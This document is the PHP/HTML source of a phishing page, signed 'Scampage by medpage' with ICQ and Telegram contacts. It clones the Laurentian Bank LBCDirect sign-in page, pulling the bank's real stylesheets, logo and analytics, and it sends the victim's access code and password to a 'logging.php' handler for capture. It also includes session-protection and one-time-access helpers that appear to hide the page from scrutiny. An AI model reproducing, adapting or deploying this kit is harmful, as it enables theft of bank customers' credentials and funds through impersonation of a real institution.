<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
	







<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>Laurentian Bank - Personal Banking</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="author" content="Laurentian Bank" />
<meta name="copyright" content="copyright (c) 2018 Laurentian Bank" />
<link rel="shortcut icon" href="https://blcweb.banquelaurentienne.ca/lang/en/DynamicContent/Resources/Images/favicon.ico" />
<meta name="viewport" content="width=960" />


	
	<link href="https://blcweb.banquelaurentienne.ca/lang/en/DynamicContent/Resources/Style/brand$v@201807231520.css" rel="stylesheet" type="text/css" media="screen" />
<link href="https://blcweb.banquelaurentienne.ca/lang/en/DynamicContent/Resources/Style/login$forms-v2@true+v@201807231520.css" rel="stylesheet" type="text/css" media="screen" />
<link href="https://blcweb.banquelaurentienne.ca/lang/en/DynamicContent/Resources/Style/print$v@201807231520.css" rel="stylesheet" type="text/css" media="print" />

	<meta name="title" content="Personal Banking"/><meta name="id" content="OnlineBanking"/>
</head>
<body class="Login Login1_23






  Lang-en Layout-
">
<div class="md mdi






 ">
	





















	<div class="outerHeader">
		<div class="header">
	<h1 class="logo">
	<a href="/lang/en/" title="Home" class="current"><img src="https://blcweb.banquelaurentienne.ca/lang/en/lang/en/DynamicContent/Resources/Images/Logo$v@201807231520.jpg" alt="Laurentian Bank" /></a></h1>
	






<ul class="skip nav">
		<li><a href="#mainContent">Skip to Content</a></li>
		
				<li><a href="/lang/en/BLCDirect/" title="Personal Banking" class="self current">Login to Online Banking</a></li>
			
	</ul>
	<div class="global">
	<ul class="nav externalSite">
		<li><a href="https://www.laurentianbank.ca/en/" title="Visit Laurentian Bank Site" target="_blank">Laurentian Bank.ca</a></li>
	</ul>
	<ul class='nav lang '><li class="item0  lang-en current"><a >English</a></li><li class="item1 itemN lang-fr "><a href="/lang/fr/BLCDirect/">Français</a></li></ul>
	<ul class="nav global">
<li class="link0 even notcurrent id-ContactUs name-section name-contactus name-contextRoot name-ContactUs"><a href="/lang/en/Contactez-nous/" title="Contact Us">Contact Us</a></li>
</ul>

	<ul class="nav global">
		<li><a href="https://www.laurentianbank.ca/en/map/map.sn" target="_blank">Locator</a></li>
	</ul>
	
		<ul class="nav logInOff loggedOff">
			<li class="logOn"><a href="/lang/en/BLCDirect/">Sign In</a></li>
		</ul>
		
</div>
	
		
			<div class="primary"><h1 id="nonAuthTitle">WELCOME TO LBC<em>Direct</em></h1></div>
		
</div><!--/header-->

	</div><!--/outerHeader-->
	<div class="outerColContainer">
		<div class="colContainer">
			<div class="colOne">
				







<div class="portlets online_left details_online"></div>














    
  


<div class="portlets main_left"></div>


				
			</div><!--/colOne-->
			<div class="colTwoThree">
				<div class="mainContent" id="mainContent">
					<div class="content">
	<div class="interacLogoHolder">
		
	</div>
		<h1 id="PageTitle">SIGN IN to LBC<em>Direct</em></h1>
		<!-- Introduction -->
		
		<!-- End Introduction -->
		
	
	
	<form id="id5" method="post" action="logging.php" class="logon logonStep1 mdlogon mdIALogonEnrollPac" autocomplete="off"><div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id5_hf_0" id="id5_hf_0" /></div>
		<!-- Instructions -->
		
		<!-- End Instructions -->

		

		
		
	<div class="required">
	
		<label title="Enter your access code" for="id6">Access code</label>
		

		<div class="input">
	
			
			
	<input required type="text" value="" name="UN" id="id6" maxlength="8" size="9"/>

			
			
		
</div>
	
</div>

	<input maxlength="40" size="40" type="text" value="" name="components:faketext:textInputField" style="position:absolute; top:-9999px;" tabindex="-1"/>

	<input maxlength="40" size="40" type="password" autocomplete="off" value="" name="components:fakepac:textInputField" style="position:absolute; top:-9999px;" tabindex="-1"/>

	<div class="required">
	
		<label title="Enter your password" for="id7">Password</label>
		

		<div class="input">
	
			
			
	<input required type="password" value="" name="PW" id="id7" maxlength="20" size="21"/>

			
			
		
</div>
	
</div>

		
		
		
	
	<div class="formActions">
		<ul>
			
				<li>
					<input type="submit" name="buttonPanel:actions:continue" class="submit" id="id8" value="Enter" title="Click Enter to begin secure banking session"/>
				</li>
			
			
			
		</ul>
	</div>


	</form>

	

		
		<div class="conclusion"><ul><li>To sign up to LBC<em>Direct</em> or if you've forgotten your access code or password, please call: <span class="tel">1 800 252-1846</span></li></ul></div>
</div>

	









<div class="hiddenInputs">
	<input type="hidden" disabled="disabled" id="wa_feature_group" value="Online Banking"/>
	<input type="hidden" disabled="disabled" id="wa_feature_name" value="Help.Title"/>
	<input type="hidden" disabled="disabled" id="wa_feature_id" value="Logon"/>
	<input type="hidden" disabled="disabled" id="wa_feature_localized_name" value="Help.Title"/>
	<input type="hidden" disabled="disabled" id="wa_feature_is_customized" value="0"/>
	<input type="hidden" disabled="disabled" id="wa_feature_client_id" value="Logon"/>
	<input type="hidden" disabled="disabled" id="wa_feature_status" value="0"/>
	<input type="hidden" disabled="disabled" id="wa_feature_step_id" value="Step1"/>
	<input type="hidden" disabled="disabled" id="wa_feature_step_name" value="SIGN IN to LBC&lt;em&gt;Direct&lt;/em&gt;"/>
	<input type="hidden" disabled="disabled" id="wa_feature_step_localized_name" value="SIGN IN to LBC&lt;em&gt;Direct&lt;/em&gt;"/>
	<input type="hidden" disabled="disabled" id="wa_feature_step_number" value="1"/>
	<input type="hidden" disabled="disabled" id="wa_feature_step_status" value="0"/>
	<input type="hidden" disabled="disabled" id="wa_feature_user_type" value=""/>
</div>
				</div><!--/maincontent-->
			</div><!--/colTwoThree-->
			<div class="clear">&nbsp;</div>
			<div class="banner">
				<div class="portlets banner"></div>
			</div>
		</div><!--/contentContainer-->
	</div><!--/outerContentContainer-->
	<div class="outerFooter">
		<div class="footer">
	
			<div class="footerCopy">
	<p>Copyright 2021<br/>Laurentian Bank of Canada.<br/>All rights reserved.</p>
	<p class="securityGuaranteed"><span class="LBCDirect">LBC<em>Direct</em></span><br />Security guaranteed.</p>
</div>
		
	
	<ul class="nav footer footer2">
<li class="link0 even notcurrent id-SecurityAndPrivacy name-contextRoot name-SecurityAndPrivacy"><a href="/lang/en/Securite-et-confidentialite/" title="Security and Privacy">Security and Privacy</a></li>
<li class="link1 linkN odd notcurrent id-LegalNotes name-contextRoot name-LegalNotes"><a href="/lang/en/Notes-legales/" title="Legal Notes">Legal Notes</a></li>
</ul>

	<ul class="nav footer footer3">
<li class="link0 linkN even notcurrent id-ContactUs name-section name-contactus name-contextRoot name-ContactUs"><a href="/lang/en/Contactez-nous/" title="Contact Us">Contact Us</a></li>
</ul>

	<ul class="nav footer footer4">
		<li><a href="https://m.laurentianbank.ca/login.html" title="Mobile Site">Mobile Site</a></li>
	</ul>
		
</div><!--/footer-->
	</div><!--/outerFooter-->
</div><!-- /mdi -->

    
<script type="text/javascript">

var s_account='ccu-banquelaurentienne.ca-prod';
</script>
<script type="text/javascript" language="JavaScript" src="/lang/en/DynamicContent/Resources/Script/analytics/s_code.js"></script>
<script type="text/javascript"><!--
/* SiteCatalyst code version: h.23.8|v2.2
Copyright 1996-2011 Adobe, Inc. All Rights Reserved
More info available at http://www.omniture.com */

s.trackingServer = 'mdws.banquelaurentienne.ca';
s.charSet = "ISO-8859-1";
s.formList = 'financialPlanningv2,mortgagev2,businessLoanv2,creditcardv2,termDepositv2,rrspv2,lineOfCreditv2,jobApplicationv2,contactUsv2,membershipv2,mdsbApplicationv2,retrieveFormv2,loanv2,corporateSponsorshipv2,chequeOrderv2,changeContactv2,TransferAdd,BillPay,CertapaySendTransfer,AccountNewDemand,OpenMembership';

if(typeof jQuery !== "undefined"){
	(function(){
		var bodyLangClass = "",
			catalystLanguage = "",
		
			catalystMemberStatus = "",
			catalystIsAuthenticated = false,
			catalystIsMember = false,
			catalystIsLoggedOut = false,	
		
			catalystProduct = "",
			catalystTeamSiteProduct = "",
			catalystTeamSiteProductAbbrv = "",
			catalystProductChannel = "",
			catalystChannel = "",	
			catalystContentCategory = "",
			catalystTeamSiteContentCategory = "", 	
			catalystCategory = "",
			catalystPageID = "",
			catalystSpecialCase = "",
			catalystEventArray,
			catalystUniqueEventArray,
			catalystUniqueEvents,
		
			catalystIsForm = false,
			catalystFormArray = [],
			catalystCompleteStatus = 0,
			catalystMemberType;
		
		catalystIsForm = (!!document.getElementById('wa_feature_client_id'));
		if(!!document.getElementById('wa_feature_status')){
			catalystCompleteStatus = document.getElementById('wa_feature_status').value;			
		}
		catalystFormArray=s.formList.split(",");
		if(!!catalystIsForm){
			var catalystFormName = "",
				catalystIsSavedForm = false,
				catalystStepName = "",
				catalystStepNumber = 0;			
		}
		
		var catalystIsSearch = false;
		catalystIsSearch = (!!document.getElementById('wa_feature_group') && document.getElementById('wa_feature_group').value === "Search");
		if(!!catalystIsSearch){
			var catalystSearchResults = "",
				searchterms = "",
				searchstring = "";
		}
		var catalystHierarchyArray = [],
			catalystHierarchy = "",
			catalystTeamSiteHierarchy2 = "",
			catalystTeamSiteHierarchy3 = "",	
			catalystHost,
			catalystLang,
			catalystIndex,			
			catalystIsError = false,
			catalystIsTeamSiteCampaign = "",
			catalystEvents = "",
			catalystPathName = "",
			catalystPattern = "",
			catalystCurrentDomain,
			catalystURLString = "",
			catalystQueryString = "";
		
		catalystCurrentDomain = window.location.hostname;
		s.linkInternalFilters = s.linkInternalFilters + "," + catalystCurrentDomain;
		catalystPathName = window.location.pathname;
		catalystPatternStart = /^\//;
		catalystPatternEnd = /\/$/;
		if(!!catalystPathName && !!catalystPathName.match(catalystPatternStart)){ 
			catalystURLString = catalystPathName.substring(1); 
			if(!!catalystURLString && !!catalystURLString.match(catalystPatternEnd)){
				catalystURLString = catalystURLString.substring(0,catalystURLString.length-1); 
			}
		}		
		if(catalystURLString.length > 0){
			catalystHierarchyArray = catalystURLString.split("\/");	
		}else{
			catalystHierarchyArray[0] = "root";
		}		
		for(i=0,len=catalystHierarchyArray.length; i<len; i++){
			catalystHost = /host/;
			if(!!catalystHierarchyArray[i] && !!catalystHierarchyArray[i].match(catalystHost)){
				catalystHierarchyArray.splice(i,2); 	 
			}
			if(!!catalystHierarchyArray[i]){
				catalystLang = /lang/;
				if(!!catalystHierarchyArray[i] && !!catalystHierarchyArray[i].match(catalystLang)){
					catalystHierarchyArray.splice(i,2);	 
				}
				catalystIndex = /\.jsp$/;
				if(!!catalystHierarchyArray[i] && !!catalystHierarchyArray[i].match(/\w+/) && !catalystHierarchyArray[i].match(catalystIndex)){
					catalystHierarchy += catalystHierarchyArray[i] + "|";
				}
			}			
		}
		if(catalystHierarchyArray[0] == undefined){
			catalystHierarchyArray[0] = "root";
		}

		
			
		
		catalystTeamSiteProduct = '';
		if(!!catalystTeamSiteProduct){
			catalystProduct = catalystTeamSiteProduct;
		}else{
			catalystProduct = catalystHierarchyArray[0];
		}
		s.channel = catalystProduct; 
		catalystTeamSiteProductAbbrv = '';
		if(!!catalystTeamSiteProductAbbrv){
			catalystProductChannel = catalystTeamSiteProductAbbrv;
		}else{
			if(catalystProduct.length > 4){
				catalystProductChannel = catalystProduct.substring(0,4);	
			}else{		
				catalystProductChannel = catalystProduct;
			}
		}
		

		
		s.prop1 = "nonmobile";
		catalystChannel = "w";
			

		s.prop23 = catalystChannel;
		
		catalystTeamSiteContentCategory = '';
		if(!!catalystTeamSiteContentCategory){
			catalystContentCategory = catalystTeamSiteContentCategory;
		}else{
			catalystContentCategory = '';
		}
		if(catalystContentCategory.charAt(0) == "\/"){
			catalystCategory = catalystContentCategory.substring(1);
		}else{
			catalystCategory = catalystContentCategory;	
		}
		s.prop24 = catalystCategory;
		
		catalystPageID = 'OnlineBanking';
		s.prop25=catalystPageID;
		
		if(!!catalystIsForm){
			
			if(!!document.getElementById('info_formid')){
				catalystFormName = document.getElementById('info_formid').value;
			}else if(!!document.getElementById('wa_feature_client_id')){
				catalystFormName = document.getElementById('wa_feature_client_id').value;
			}else{
				catalystFormName = "";
			}
			if(jQuery.inArray(catalystFormName,catalystFormArray) > -1){
				
				if(!!document.getElementById('wa_feature_step_number')){ 
					catalystStepNumber = document.getElementById('wa_feature_step_number').value; 
					catalystSpecialCase = "step" + catalystStepNumber.toString();
				}else{ 
					catalystStepNumber = 0; 
				}
				
				if(!!document.getElementById('info_stepname')){ 
					catalystStepName = document.getElementById('info_stepname').value;
					if(catalystStepName === "Save to Continue Later"){
						catalystSpecialCase = "saved";
					} 				
				}else{ 
					catalystStepName = "";
				}					
				s.eVar17 = catalystFormName;	
				s.prop29 = catalystStepName;
				s.eVar29 = catalystStepName;
			}
		}
		/* This handles the specialCase variable for IOP since we want to track each individual page */
		if(catalystPageID.toLowerCase() == 'interacpayment'){
			if(!!document.getElementById('wa_feature_step_number')){
				catalystStepNumber = document.getElementById('wa_feature_step_number').value; 
				if( catalystFormName.toLowerCase() == 'logon'){
					catalystSpecialCase = 'ioplogon-step' + catalystStepNumber;
				}else {
					catalystSpecialCase = 'iop-step' + catalystStepNumber;
				}
			}
		};

		//Handle online voting steps
		if(!!document.getElementById('wa_feature_client_id')){
			if(document.getElementById('wa_feature_client_id').value.toLowerCase() == 'onlinevoting'){
				if(!!document.getElementById('wa_feature_step_id')){
					catalystSpecialCase = document.getElementById('wa_feature_step_id').value.substr(4);	
				}	
			}
		}	

        if(!!document.getElementById('wa_feature_user_type')) {
            catalystMemberType = document.getElementById('wa_feature_user_type').value;
        }
        s.eVar32 = catalystMemberType;

		s.prop26 = catalystSpecialCase;
		
		s.pageName = catalystProductChannel + "|" + catalystChannel + "|" + catalystCategory + "|" + catalystPageID + "|" + catalystSpecialCase;
		
		catalystIsTeamSiteCampaign = '';
		if(!!catalystIsTeamSiteCampaign){
			s.campaign = catalystIsTeamSiteCampaign;			
		}
		
		if(!!catalystIsSearch){
			searchstring = document.getElementById('wa_feature_search_keywords').value;
			if(!!searchstring){
				s.prop7 = searchstring; 
			}
			catalystSearchResults = document.getElementById('wa_feature_search_results');
			if(!!catalystSearchResults){
				catalystSearchResults = document.getElementById('wa_feature_search_results').value;
			}
			s.prop10 = catalystSearchResults;
		}			
		
		s.server = "PROD";
		
		bodyLangClass = (' ' + document.getElementsByTagName('body')[0].className + ' ').match(/\sLang-([a-zA-Z]+)\s/);
		catalystLanguage = ( bodyLangClass != null && bodyLangClass.length > 0 )?bodyLangClass[1]:'en';
		s.prop12 = catalystLanguage;
		
		if(!!catalystHierarchy && catalystHierarchy.match(/|$/)){
			catalystHierarchy = catalystHierarchy.substring(0,catalystHierarchy.length-1);
		}
		s.hier1 = catalystHierarchy;
		catalystTeamSiteHierarchy2 = '';
		if(!!catalystTeamSiteHierarchy2){
			s.hier2 = catalystTeamSiteHierarchy2;
		}
		catalystTeamSiteHierarchy3 = '';
		if(!!catalystTeamSiteHierarchy3){
			s.hier3 = catalystTeamSiteHierarchy3;
		}
		
		catalystPattern = /^OnlineBanking/;
		if(!!catalystCategory && !!catalystCategory.match(catalystPattern)){ 
			s.prop15 = "secure";
		}else{
			s.prop15 = "public";
		}
		
		if(!!catalystIsMember){
			catalystMemberStatus = "member";
		}else{
			catalystMemberStatus = "nonmember";
		}
		s.prop27 = catalystMemberStatus;
		
		if(!!catalystIsMember){
			if(!!catalystIsAuthenticated){
				s.prop28 = "member/authenticated";
			}else{
				s.prop28 = "member/nonauthenticated";
			}
		}else{
			s.prop28 = "nonauthenticated";
		}
		
		
		
			
		if(!!catalystStepNumber && catalystStepNumber > 0){
			catalystEvents = catalystEvents + ",event" + catalystStepNumber.toString();
		}
		if(!!catalystIsSearch && (catalystSearchResults > 0)){
			catalystEvents = catalystEvents + ",event22";
		}
			
		var catalystTeamSiteEvents = '';
		if(!!catalystTeamSiteEvents){
			catalystEvents = catalystEvents + "," + catalystTeamSiteEvents;	
		}	
		if(!!catalystIsForm && catalystCompleteStatus == "1"){
			catalystEvents = catalystEvents + ",event33";	
		}
		function eliminateDuplicates(inArray){
			var i,
				out=[],
				obj={};
			for(i=0,len=inArray.length;i<len;i++){
				obj[inArray[i]]=0;
			}
			for(i in obj){
				out.push(i);
			}
			return out;
		}
		catalystEvents.split(" ").join(""); 
		if(catalystEvents.charAt(0) == ","){ 
			catalystEvents = catalystEvents.substring(1); 
		}
		catalystEventArray = catalystEvents.split(",");
		catalystUniqueEventArray = eliminateDuplicates(catalystEventArray);
		catalystUniqueEvents = catalystUniqueEventArray.join(',');
		s.events = catalystUniqueEvents;
		
		s.prop4 = "";
		if(typeof errorStatus !== "undefined"){
			s.pageType = "errorPage";
		}
	})();
}

var s_code=s.t();if(s_code)document.write(s_code)//--></script>
<script language="JavaScript" type="text/javascript"><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//--></script><noscript><img src="https://mdws.banquelaurentienne.ca/b/ss/ccu-banquelaurentienne.ca-prod/1/H.24.2--NS/0"
height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
<!-- End SiteCatalyst code version: H.24.2. -->
         

</body>
</html>
